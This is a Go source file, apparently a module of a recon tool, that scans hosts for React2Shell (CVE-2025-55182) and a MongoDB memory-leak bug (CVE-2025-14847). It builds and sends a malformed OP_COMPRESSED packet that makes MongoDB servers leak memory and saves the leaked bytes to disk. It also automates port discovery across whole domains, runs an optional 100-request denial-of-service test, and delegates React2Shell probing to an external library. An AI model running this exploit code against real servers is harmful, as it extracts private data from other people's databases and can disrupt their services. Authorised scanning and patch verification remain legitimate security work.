package zerodays

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	next88 "github.com/h0tak88r/AutoAR/internal/tools/next88"
	"github.com/h0tak88r/AutoAR/internal/modules/livehosts"
	"github.com/h0tak88r/AutoAR/internal/modules/utils"
	"github.com/projectdiscovery/httpx/runner"
	"github.com/projectdiscovery/goflags"
	naaburesult "github.com/projectdiscovery/naabu/v2/pkg/result"
	naaburunner "github.com/projectdiscovery/naabu/v2/pkg/runner"
)

// Options for zerodays scan
type Options struct {
	Domain              string   // Domain to scan (or subdomain)
	Subdomain           string   // Single subdomain to scan (alternative to Domain)
	DomainsFile         string   // File with domains (one per line)
	HostsFile           string   // Alias for DomainsFile, file with hosts/subdomains/IPs
	URLs                []string // Direct URLs to test
	Threads             int      // Number of threads
	DOSTest             bool     // Enable DoS test for React2Shell
	EnableSourceExposure bool   // Enable source exposure check for React2Shell
	Silent              bool     // Silent mode
	CVEs                []string // CVEs to check: "CVE-2025-55182" (React2Shell), "CVE-2025-14847" (MongoDB)
	MongoDBHost         string   // MongoDB host (for CVE-2025-14847)
	MongoDBPort         int      // MongoDB port (default: 27017)
	MongoDBLeakSize     int      // Memory leak size in bytes (default: 65536)
}

// Result holds scan results
type Result struct {
	Domain              string
	React2ShellVulns    []React2ShellFinding
	MongoDBVulns       []MongoDBFinding
	TotalHostsScanned  int
	TotalVulnerable    int
}

// React2ShellFinding represents a React2Shell vulnerability finding
type React2ShellFinding struct {
	URL      string
	Type     string // e.g., "normal", "waf-bypass", "vercel-waf", "dos", "source-exposure"
	Severity string
}

// MongoDBFinding represents a MongoDB CVE-2025-14847 vulnerability finding
type MongoDBFinding struct {
	Host        string
	Port        int
	Vulnerable  bool
	LeakedData   []byte
	LeakSize    int
	Error       string
}

// logInfo logs an info message only if not in silent mode
func (opts Options) logInfo(format string, args ...interface{}) {
	if !opts.Silent {
		log.Printf(format, args...)
	}
}

// logWarn logs a warning message only if not in silent mode
func (opts Options) logWarn(format string, args ...interface{}) {
	if !opts.Silent {
		log.Printf(format, args...)
	}
}

// Run executes zerodays scan based on options
func Run(opts Options) (*Result, error) {
	result := &Result{
		React2ShellVulns: []React2ShellFinding{},
		MongoDBVulns:     []MongoDBFinding{},
	}

	// Determine which CVEs to check
	cvesToCheck := opts.CVEs
	if len(cvesToCheck) == 0 {
		// Default: check all
		cvesToCheck = []string{"CVE-2025-55182", "CVE-2025-14847"}
	}


	// Check React2Shell (CVE-2025-55182)
	if contains(cvesToCheck, "CVE-2025-55182") {
		react2ShellResult, count, err := checkReact2Shell(opts)
		if err != nil {
			opts.logWarn("[WARN] React2Shell check failed: %v", err)
		} else {
			result.React2ShellVulns = react2ShellResult
			result.TotalHostsScanned += count
			for _, v := range react2ShellResult {
				if v.Severity != "" {
					result.TotalVulnerable++
				}
			}
		}
	}

	// Check MongoDB CVE-2025-14847
	if contains(cvesToCheck, "CVE-2025-14847") {
		mongoResult, count, err := checkMongoDB(opts)
		if err != nil {
			opts.logWarn("[WARN] MongoDB CVE-2025-14847 check failed: %v", err)
		} else {
			result.MongoDBVulns = mongoResult
			// If React2Shell already counted hosts, we might be double counting if they are the same
			// But since MongoDB discovery might find different hosts (only those with port 27017),
			// and React2Shell scans everything, it's safer to just take the max if they use the same input,
			// or add them if they are distinct.
			// For simplicity and to avoid complex tracking, if React2Shell ran, we already have some count.
			if result.TotalHostsScanned < count {
				result.TotalHostsScanned = count
			} else if result.TotalHostsScanned == 0 {
				result.TotalHostsScanned = count
			}
			
			for _, v := range mongoResult {
				if v.Vulnerable {
					result.TotalVulnerable++
				}
			}
		}
	}

	return result, nil
}

// checkReact2Shell checks for React2Shell vulnerability (CVE-2025-55182)
func checkReact2Shell(opts Options) ([]React2ShellFinding, int, error) {
	var findings []React2ShellFinding

	// Get live hosts if domain/subdomain is provided
	var hosts []string
	target := opts.Subdomain
	if target == "" {
		target = opts.Domain
	}

	if target != "" {
		// Determine if it's a subdomain (has more than 2 parts)
		parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://"), ".")
		isSubdomain := len(parts) > 2

		var liveHostsFile string
		var err error

		if isSubdomain {
			// Single subdomain mode: check if this one URL is live, no enumeration
			subdomainClean := strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://")
			// Remove trailing slash if present
			subdomainClean = strings.TrimSuffix(subdomainClean, "/")
			resultsDir := utils.GetResultsDir()
			domainDir := filepath.Join(resultsDir, subdomainClean)
			subsDir := filepath.Join(domainDir, "subs")
			liveHostsFile = filepath.Join(subsDir, "live-subs.txt")

			// Check if file exists
			if info, err := os.Stat(liveHostsFile); err != nil || info.Size() == 0 {
				// File doesn't exist, check if this single subdomain URL is live
				opts.logInfo("[INFO] Checking if subdomain %s is live (single URL check, no enumeration)...", subdomainClean)
				
				// Check if subdomain is live using httpx directly (no enumeration)
				liveURL, err2 := checkSingleSubdomainLive(subdomainClean, opts.Threads)
				if err2 != nil {
					return nil, 0, fmt.Errorf("failed to check if subdomain %s is live: %w", subdomainClean, err2)
				}
				if liveURL == "" {
					return nil, 0, fmt.Errorf("subdomain %s is not live", subdomainClean)
				}
				
				// Create directory if needed
				if err := os.MkdirAll(subsDir, 0755); err != nil {
					return nil, 0, fmt.Errorf("failed to create subs directory: %w", err)
				}
				
				// Write the single live URL to file
				if err := os.WriteFile(liveHostsFile, []byte(liveURL+"\n"), 0644); err != nil {
					return nil, 0, fmt.Errorf("failed to write live hosts file: %w", err)
				}
				opts.logInfo("[INFO] Subdomain %s is live, saved to: %s", subdomainClean, liveHostsFile)
			} else {
				opts.logInfo("[INFO] Using existing live hosts file for subdomain: %s", liveHostsFile)
			}
		} else {
			// Domain mode: check results dir and database first, only run livehosts if not found
			liveHostsFile, err = livehosts.GetLiveHostsFile(target)
			if err != nil {
				// File not found in results dir or database, run livehosts module
				opts.logInfo("[INFO] Live hosts file not found for %s, running livehosts module...", target)
				liveHostsResult, err2 := livehosts.FilterLiveHosts(target, opts.Threads, false)
				if err2 != nil {
					return nil, 0, fmt.Errorf("failed to get live hosts: %w", err2)
				}
				liveHostsFile = liveHostsResult.LiveSubsFile
				if liveHostsFile == "" {
					return nil, 0, fmt.Errorf("live hosts file path is empty")
				}
			} else {
				opts.logInfo("[INFO] Using existing live hosts file from results dir or database: %s", liveHostsFile)
			}
		}

		// Read hosts from file
		file, err := os.Open(liveHostsFile)
		if err != nil {
			return nil, 0, fmt.Errorf("failed to open live hosts file: %w", err)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" {
				// Extract hostname from URL
				host := line
				if strings.HasPrefix(host, "http://") {
					host = strings.TrimPrefix(host, "http://")
				} else if strings.HasPrefix(host, "https://") {
					host = strings.TrimPrefix(host, "https://")
				}
				if idx := strings.Index(host, "/"); idx != -1 {
					host = host[:idx]
				}
				if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
					line = "https://" + line
				}
				hosts = append(hosts, line)
			}
		}
		if err := scanner.Err(); err != nil {
			return nil, 0, fmt.Errorf("error reading live hosts file: %w", err)
		}
	} else if len(opts.URLs) > 0 {
		hosts = opts.URLs
	} else {
		hostsFile := opts.HostsFile
		if hostsFile == "" {
			hostsFile = opts.DomainsFile
		}

		if hostsFile != "" {
			// Read from file
			file, err := os.Open(hostsFile)
			if err != nil {
				return nil, 0, fmt.Errorf("failed to open hosts file: %w", err)
			}
			defer file.Close()

			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				line := strings.TrimSpace(scanner.Text())
				if line != "" && !strings.HasPrefix(line, "#") {
					if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
						line = "https://" + line
					}
					hosts = append(hosts, line)
				}
			}
			if err := scanner.Err(); err != nil {
				return nil, 0, fmt.Errorf("error reading hosts file: %w", err)
			}
		}
	}

	if len(hosts) == 0 {
		return findings, 0, nil
	}

	// Run next88 smart scan with threading
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	opts.logInfo("[INFO] Starting React2Shell scan on %d host(s) with threading", len(hosts))
	scanArgs := []string{"-smart-scan"}
	results, err := runNext88Scan(ctx, hosts, scanArgs, opts.Threads, opts.Silent)
	if err != nil {
		return nil, 0, fmt.Errorf("next88 scan failed: %w", err)
	}

	// Convert results to findings
	for url, vulnType := range results {
		findings = append(findings, React2ShellFinding{
			URL:      url,
			Type:     vulnType,
			Severity: "HIGH", // React2Shell is a high severity RCE
		})
	}

	// DoS test if enabled (with threading)
	if opts.DOSTest {
		opts.logInfo("[INFO] Running DoS test on %d host(s) with threading", len(hosts))
		dosCtx, dosCancel := context.WithTimeout(context.Background(), 5*time.Minute)
		dosResults, err := runNext88Scan(dosCtx, hosts, []string{"-dos-test", "-dos-requests", "100"}, opts.Threads, opts.Silent)
		dosCancel()
		if err == nil {
			for url, vulnType := range dosResults {
				// Check if already exists
				found := false
				for i := range findings {
					if findings[i].URL == url {
						if !strings.Contains(findings[i].Type, vulnType) {
							findings[i].Type += "," + vulnType
						}
						found = true
						break
					}
				}
				if !found {
					findings = append(findings, React2ShellFinding{
						URL:      url,
						Type:     vulnType,
						Severity: "HIGH",
					})
				}
			}
		}
	}

	// Source exposure check if enabled (with threading)
	if opts.EnableSourceExposure {
		opts.logInfo("[INFO] Running source exposure check on %d host(s) with threading", len(hosts))
		sourceCtx, sourceCancel := context.WithTimeout(context.Background(), 5*time.Minute)
		sourceResults, err := runNext88Scan(sourceCtx, hosts, []string{"-check-source-exposure"}, opts.Threads, opts.Silent)
		sourceCancel()
		if err == nil {
			for url, vulnType := range sourceResults {
				found := false
				for i := range findings {
					if findings[i].URL == url {
						if !strings.Contains(findings[i].Type, vulnType) {
							findings[i].Type += "," + vulnType
						}
						found = true
						break
					}
				}
				if !found {
					findings = append(findings, React2ShellFinding{
						URL:      url,
						Type:     vulnType,
						Severity: "MEDIUM",
					})
				}
			}
		}
	}

	return findings, len(hosts), nil
}

// checkMongoDB checks for MongoDB CVE-2025-14847 vulnerability
func checkMongoDB(opts Options) ([]MongoDBFinding, int, error) {
	var findings []MongoDBFinding

	host := opts.MongoDBHost
	port := opts.MongoDBPort
	if port == 0 {
		port = 27017
	}
	leakSize := opts.MongoDBLeakSize
	if leakSize == 0 {
		leakSize = 65536 // 64KB default
	}

	// Determine MongoDB hosts to test
	var mongoHosts []string
	if host != "" {
		mongoHosts = []string{host}
	} else {
		// No explicit host provided - discover MongoDB instances
		var liveHostsFile string
		
		// Priority 1: Use explicit HostsFile/DomainsFile if provided
		if opts.HostsFile != "" {
			liveHostsFile = opts.HostsFile
		} else if opts.DomainsFile != "" {
			liveHostsFile = opts.DomainsFile
		} else {
			// Priority 2: Try to find live-subs.txt for Domain/Subdomain
			target := opts.Subdomain
			if target == "" {
				target = opts.Domain
			}
			
			if target != "" {
				// Clean target
				targetClean := strings.TrimPrefix(strings.TrimPrefix(target, "http://"), "https://")
				targetClean = strings.TrimSuffix(targetClean, "/")
				
				// Determine if it's a subdomain
				parts := strings.Split(targetClean, ".")
				isSubdomain := len(parts) > 2
				
				resultsDir := utils.GetResultsDir()
				var domainDir string
				if isSubdomain {
					domainDir = filepath.Join(resultsDir, targetClean)
				} else {
					domainDir, _ = utils.DomainDirInit(targetClean)
				}
				subsDir := filepath.Join(domainDir, "subs")
				liveHostsFile = filepath.Join(subsDir, "live-subs.txt")
				
				// Check if live hosts file exists
				if info, err := os.Stat(liveHostsFile); err != nil || info.Size() == 0 {
					opts.logWarn("[WARN] Live hosts file not found for %s, skipping MongoDB discovery", targetClean)
					return nil, 0, nil // Return empty, not error
				}
			}
		}

		if liveHostsFile != "" {
			opts.logInfo("[INFO] Discovering MongoDB instances by scanning %s for port %d...", liveHostsFile, port)
			
			// Use naabu to scan hosts for MongoDB port
			discoveredHosts, err := discoverMongoDBHosts(liveHostsFile, port, opts.Threads, opts.Silent)
			if err != nil {
				return nil, 0, fmt.Errorf("failed to discover MongoDB hosts: %w", err)
			}
			
			if len(discoveredHosts) == 0 {
				opts.logWarn("[INFO] No MongoDB instances found on port %d", port)
				return findings, 0, nil
			}
			
			mongoHosts = discoveredHosts
			opts.logWarn("[INFO] Found %d MongoDB host(s) with port %d open", len(mongoHosts), port)
		} else {
			return nil, 0, fmt.Errorf("MongoDB host, domain, subdomain, or hosts file required for CVE-2025-14847 check")
		}
	}

	// Use threading for concurrent MongoDB testing
	threads := opts.Threads
	if threads <= 0 {
		threads = 50 // Default to 50 concurrent connections
	}
	if threads > len(mongoHosts) {
		threads = len(mongoHosts)
	}

	opts.logInfo("[INFO] Testing %d MongoDB host(s) with %d concurrent threads", len(mongoHosts), threads)

	// Create channels for work distribution and results
	hostChan := make(chan string, len(mongoHosts))
	resultChan := make(chan MongoDBFinding, len(mongoHosts))
	var wg sync.WaitGroup

	// Start worker goroutines
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for h := range hostChan {
				finding := testMongoDBVulnerability(h, port, leakSize, opts.Silent)
				resultChan <- finding
			}
		}()
	}

	// Send hosts to channel
	for _, h := range mongoHosts {
		hostChan <- h
	}
	close(hostChan)

	// Wait for all workers to complete
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// Collect results
	for finding := range resultChan {
		if finding.Vulnerable || finding.Error != "" {
			findings = append(findings, finding)
		}
	}

	return findings, len(mongoHosts), nil
}

// testMongoDBVulnerability tests a MongoDB instance for CVE-2025-14847
func testMongoDBVulnerability(host string, port, leakSize int, silent bool) MongoDBFinding {
	finding := MongoDBFinding{
		Host:       host,
		Port:       port,
		Vulnerable: false,
		LeakSize:   leakSize,
	}

	address := fmt.Sprintf("%s:%d", host, port)
	if !silent {
		log.Printf("[INFO] Testing MongoDB CVE-2025-14847 on %s", address)
	}

	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		finding.Error = fmt.Sprintf("Connection failed: %v", err)
		return finding
	}
	defer conn.Close()

	// Build malformed OP_COMPRESSED packet
	packet, err := buildMalformedMongoDBPacket(leakSize)
	if err != nil {
		finding.Error = fmt.Sprintf("Failed to build packet: %v", err)
		return finding
	}

	// Send packet
	if _, err := conn.Write(packet); err != nil {
		finding.Error = fmt.Sprintf("Failed to send packet: %v", err)
		return finding
	}

	// Read response header (16 bytes)
	header := make([]byte, 16)
	if _, err := io.ReadFull(conn, header); err != nil {
		finding.Error = fmt.Sprintf("Failed to read response header: %v", err)
		return finding
	}

	// Parse response length
	responseLen := int(binary.LittleEndian.Uint32(header[0:4]))
	if responseLen < 16 {
		finding.Error = "Invalid response length"
		return finding
	}

	// Read leaked data
	remaining := responseLen - 16
	leakedData := make([]byte, remaining)
	if remaining > 0 {
		if n, err := io.ReadFull(conn, leakedData); err != nil && err != io.ErrUnexpectedEOF {
			finding.Error = fmt.Sprintf("Failed to read leaked data: %v", err)
			return finding
		} else {
			leakedData = leakedData[:n]
		}
	}

	// Check if we got leaked data (vulnerable)
	if len(leakedData) > 0 {
		finding.Vulnerable = true
		finding.LeakedData = leakedData
		if !silent {
			log.Printf("[OK] MongoDB CVE-2025-14847: Vulnerable! Leaked %d bytes from %s", len(leakedData), address)
		}
		
		// Send real-time webhook notification for MongoDB vulnerability
		message := fmt.Sprintf("🔴 **Zerodays Vulnerability Found**\n**Host:** `%s:%d`\n**CVE:** CVE-2025-14847 (MongoDB Memory Leak)\n**Leaked:** %d bytes\n**Severity:** HIGH", host, port, len(leakedData))
		utils.SendWebhookLogAsync(message)
	} else {
		if !silent {
			log.Printf("[INFO] MongoDB CVE-2025-14847: Not vulnerable or patched on %s", address)
		}
	}

	return finding
}

// buildMalformedMongoDBPacket builds a malformed OP_COMPRESSED packet for CVE-2025-14847
// Based on the PoC from https://raw.githubusercontent.com/ProbiusOfficial/CVE-2025-14847/refs/heads/main/poc.py
func buildMalformedMongoDBPacket(leakSize int) ([]byte, error) {
	// 1. Prepare a legitimate OP_QUERY payload
	// BSON document: {"isMaster": 1}
	bsonPayload := []byte{
		0x13, 0x00, 0x00, 0x00, // Document length (19 bytes)
		0x10, // String type
		'i', 's', 'M', 'a', 's', 't', 'e', 'r', 0x00, // "isMaster"
		0x01, 0x00, 0x00, 0x00, // Value: 1 (int32)
		0x00, // End of document
	}

	// OP_QUERY header: flags(0) + collection("admin.$cmd") + nToSkip(0) + nToReturn(-1)
	flags := make([]byte, 4) // flags = 0
	collection := []byte("admin.$cmd\x00")
	nToSkip := make([]byte, 4) // 0
	nToReturn := make([]byte, 4)
	binary.LittleEndian.PutUint32(nToReturn, 0xFFFFFFFF) // -1

	originalMsg := append(flags, collection...)
	originalMsg = append(originalMsg, nToSkip...)
	originalMsg = append(originalMsg, nToReturn...)
	originalMsg = append(originalMsg, bsonPayload...)

	// 2. Compress the original message using zlib
	var compressedBody bytes.Buffer
	writer := zlib.NewWriter(&compressedBody)
	if _, err := writer.Write(originalMsg); err != nil {
		return nil, fmt.Errorf("failed to compress message: %w", err)
	}
	if err := writer.Close(); err != nil {
		return nil, fmt.Errorf("failed to close zlib writer: %w", err)
	}
	compressed := compressedBody.Bytes()

	// 3. Construct malicious OP_COMPRESSED packet
	opCompressed := make([]byte, 0)
	
	// originalOpcode: 2004 (OP_QUERY)
	opCompressed = append(opCompressed, make([]byte, 4)...)
	binary.LittleEndian.PutUint32(opCompressed[len(opCompressed)-4:], 2004)
	
	// uncompressedSize: MALICIOUS large value (the vulnerability)
	opCompressed = append(opCompressed, make([]byte, 4)...)
	binary.LittleEndian.PutUint32(opCompressed[len(opCompressed)-4:], uint32(leakSize))
	
	// compressorId: 2 (zlib)
	opCompressed = append(opCompressed, 0x02)
	
	// compressed data
	opCompressed = append(opCompressed, compressed...)

	// 4. Construct message header
	requestID := uint32(time.Now().UnixNano() % 100000)
	opCode := uint32(2012) // OP_COMPRESSED
	totalLen := 16 + len(opCompressed)

	header := make([]byte, 16)
	binary.LittleEndian.PutUint32(header[0:4], uint32(totalLen))
	binary.LittleEndian.PutUint32(header[4:8], requestID)
	binary.LittleEndian.PutUint32(header[8:12], 0) // responseTo
	binary.LittleEndian.PutUint32(header[12:16], opCode)

	return append(header, opCompressed...), nil
}

// runNext88Scan runs next88 scan and returns results with threading support
func runNext88Scan(ctx context.Context, hosts []string, args []string, requestedThreads int, silent bool) (map[string]string, error) {
	results := make(map[string]string)
	var mu sync.Mutex

	// Determine thread count
	threads := requestedThreads
	if threads <= 0 {
		threads = 50 // Default
	}
	if len(hosts) < threads {
		threads = len(hosts)
	}
	if threads == 0 {
		threads = 1
	}

	// Create scan options
	opts := next88.ScanOptions{
		Timeout:         30 * time.Second,
		VerifySSL:       false,
		FollowRedirects: true,
		SafeCheck:       false,
		Windows:         false,
		WAFBypass:       false,
		VercelWAFBypass: false,
		Threads:         threads, // Use calculated thread count
		Quiet:           true,
		NoColor:         true,
		AllResults:      true,
	}

	// Parse args to set options
	for _, arg := range args {
		switch arg {
		case "-smart-scan":
			opts.SmartScan = true
		case "-dos-test":
			opts.DOSTest = true
		case "-check-source-exposure":
			opts.CheckSourceExp = true
		}
	}

	if !silent {
		log.Printf("[INFO] Running next88 scan on %d host(s) with %d threads", len(hosts), threads)
	}

	// Run scans using next88 library (already uses threading internally)
	scanResults, err := next88.Run(hosts, opts)
	if err != nil {
		return nil, fmt.Errorf("next88 scan failed: %w", err)
	}
	
	// Convert results to map and send real-time webhook notifications
	for _, result := range scanResults {
		if result.Vulnerable != nil && *result.Vulnerable {
			mu.Lock()
			results[result.Host] = result.VulnType
			mu.Unlock()
			
			// Send real-time webhook notification for this vulnerability
			vulnType := result.VulnType
			if vulnType == "" {
				vulnType = "React2Shell"
			}
			message := fmt.Sprintf("🔴 **Zerodays Vulnerability Found**\n**Host:** `%s`\n**CVE:** CVE-2025-55182 (React2Shell RCE)\n**Type:** `%s`\n**Severity:** HIGH", result.Host, vulnType)
			utils.SendWebhookLogAsync(message)
		}
	}

	return results, nil
}

// contains checks if a string slice contains a value
func contains(slice []string, value string) bool {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}

// SaveResults saves scan results to file
// Always creates files even if empty, so webhook can find them
func SaveResults(result *Result, outputDir string) error {
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	// Always save React2Shell results file (even if empty)
	react2ShellFile := filepath.Join(outputDir, "react2shell-cve-2025-55182.txt")
	f, err := os.Create(react2ShellFile)
	if err != nil {
		return fmt.Errorf("failed to create React2Shell results file: %w", err)
	}
	if len(result.React2ShellVulns) > 0 {
		for _, vuln := range result.React2ShellVulns {
			fmt.Fprintf(f, "%s [%s] - %s\n", vuln.URL, vuln.Type, vuln.Severity)
		}
	}
	f.Close()

	// Always save MongoDB results file (even if empty)
	mongoFile := filepath.Join(outputDir, "mongodb-cve-2025-14847.txt")
	f2, err := os.Create(mongoFile)
	if err != nil {
		return fmt.Errorf("failed to create MongoDB results file: %w", err)
	}
	if len(result.MongoDBVulns) > 0 {
		for _, vuln := range result.MongoDBVulns {
			if vuln.Vulnerable {
				fmt.Fprintf(f2, "%s:%d - VULNERABLE (leaked %d bytes)\n", vuln.Host, vuln.Port, len(vuln.LeakedData))
				// Save leaked data to separate file
				if len(vuln.LeakedData) > 0 {
					leakFile := filepath.Join(outputDir, fmt.Sprintf("mongodb-leaked-%s-%d.bin", strings.ReplaceAll(vuln.Host, ".", "_"), vuln.Port))
					if err := os.WriteFile(leakFile, vuln.LeakedData, 0644); err != nil {
						log.Printf("[WARN] Failed to save leaked data: %v", err)
					}
				}
			} else if vuln.Error != "" {
				fmt.Fprintf(f2, "%s:%d - %s\n", vuln.Host, vuln.Port, vuln.Error)
			}
		}
	}
	f2.Close()

	// Always save JSON summary
	jsonFile := filepath.Join(outputDir, "zerodays-results.json")
	jsonData, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal results: %w", err)
	}
	if err := os.WriteFile(jsonFile, jsonData, 0644); err != nil {
		return fmt.Errorf("failed to write JSON file: %w", err)
	}

	return nil
}

// checkSingleSubdomainLive checks if a single subdomain URL is live using httpx
// Returns the live URL (https:// or http://) or empty string if not live
func checkSingleSubdomainLive(subdomain string, threads int) (string, error) {
	if threads <= 0 {
		threads = 1 // Single URL, only need 1 thread
	}
	
	// Try both http and https
	targets := []string{
		"https://" + subdomain,
		"http://" + subdomain,
	}
	
	var liveURL string
	var mu sync.Mutex
	
	// Configure httpx options
	options := runner.Options{
		InputTargetHost: targets,
		Threads:        threads,
		Silent:         true,
		NoColor:        true,
		FollowRedirects: true,
		FollowHostRedirects: true,
		HTTPProxy:      os.Getenv("HTTP_PROXY"),
		SocksProxy:     os.Getenv("SOCKS_PROXY"),
		OnResult: func(result runner.Result) {
			if result.URL != "" {
				mu.Lock()
				if liveURL == "" {
					liveURL = result.URL
				}
				mu.Unlock()
			}
		},
	}
	
	// Validate options
	if err := options.ValidateOptions(); err != nil {
		return "", fmt.Errorf("failed to validate httpx options: %w", err)
	}
	
	// Create httpx runner
	httpxRunner, err := runner.New(&options)
	if err != nil {
		return "", fmt.Errorf("failed to create httpx runner: %w", err)
	}
	defer httpxRunner.Close()
	
	// Run check
	httpxRunner.RunEnumeration()
	
	return liveURL, nil
}

// discoverMongoDBHosts uses naabu to scan live hosts for MongoDB port (27017)
// Returns list of hostnames that have the MongoDB port open
func discoverMongoDBHosts(liveHostsFile string, mongoPort int, threads int, silent bool) ([]string, error) {
	if threads <= 0 {
		threads = 50
	}
	
	// Read hosts from live hosts file
	file, err := os.Open(liveHostsFile)
	if err != nil {
		return nil, fmt.Errorf("failed to open live hosts file: %w", err)
	}
	defer file.Close()
	
	var hosts []string
	scanner := bufio.NewScanner(file)
	seen := make(map[string]struct{})
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		
		// Extract hostname from URL
		host := line
		if strings.HasPrefix(host, "http://") {
			host = strings.TrimPrefix(host, "http://")
		} else if strings.HasPrefix(host, "https://") {
			host = strings.TrimPrefix(host, "https://")
		}
		if idx := strings.Index(host, "/"); idx != -1 {
			host = host[:idx]
		}
		if idx := strings.Index(host, ":"); idx != -1 {
			host = host[:idx]
		}
		
		if host == "" {
			continue
		}
		if _, ok := seen[host]; ok {
			continue
		}
		seen[host] = struct{}{}
		hosts = append(hosts, host)
	}
	
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading live hosts file: %w", err)
	}
	
	if len(hosts) == 0 {
		return nil, fmt.Errorf("no hosts found in live hosts file")
	}
	
	if !silent {
		log.Printf("[INFO] Scanning %d live host(s) for MongoDB port %d", len(hosts), mongoPort)
	}
	
	// Use naabu to scan for MongoDB port
	var mongoHosts []string
	var mu sync.Mutex
	
	onResult := func(hr *naaburesult.HostResult) {
		if hr == nil || len(hr.Ports) == 0 {
			return
		}
		
		// Extract hostname
		host := hr.Host
		if strings.HasPrefix(host, "http://") {
			host = strings.TrimPrefix(host, "http://")
		} else if strings.HasPrefix(host, "https://") {
			host = strings.TrimPrefix(host, "https://")
		}
		if idx := strings.Index(host, "/"); idx != -1 {
			host = host[:idx]
		}
		
		// Check if MongoDB port is open
		for _, p := range hr.Ports {
			if p != nil && p.Port == mongoPort {
				mu.Lock()
				mongoHosts = append(mongoHosts, host)
				mu.Unlock()
				if !silent {
					log.Printf("[OK] Found MongoDB port %d open on %s", mongoPort, host)
				}
				break
			}
		}
	}
	
	options := &naaburunner.Options{
		Host:     goflags.StringSlice(hosts),
		ScanType: "c", // connect scan
		Rate:     threads * 100,
		Timeout:  5,
		Retries:  1,
		OnResult: onResult,
	}
	
	r, err := naaburunner.NewRunner(options)
	if err != nil {
		return nil, fmt.Errorf("failed to create naabu runner: %w", err)
	}
	defer r.Close()
	
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	
	if err := r.RunEnumeration(ctx); err != nil {
		// Return discovered hosts even if scan had errors
		if len(mongoHosts) > 0 {
			if !silent {
				log.Printf("[WARN] Naabu scan had errors but found %d MongoDB host(s)", len(mongoHosts))
			}
			return mongoHosts, nil
		}
		return nil, fmt.Errorf("naabu scan failed: %w", err)
	}
	
	return mongoHosts, nil
}
